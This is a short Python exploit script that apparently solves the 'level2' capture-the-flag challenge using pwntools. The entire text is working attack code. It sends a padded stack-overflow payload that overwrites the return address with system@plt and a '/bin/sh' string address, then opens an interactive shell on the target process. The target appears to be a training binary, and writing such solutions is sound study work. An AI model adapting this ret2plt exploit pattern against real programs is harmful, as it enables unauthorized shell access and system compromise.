from pwn import *

sh = process("./level2")
elf = ELF("./level2")
binsh = 0x0804a024
system_plt = elf.plt['system']

payload = flat(b'a' * 0x8c, system_plt, b'b' * 4, binsh)
sh.sendline(payload)
sh.interactive()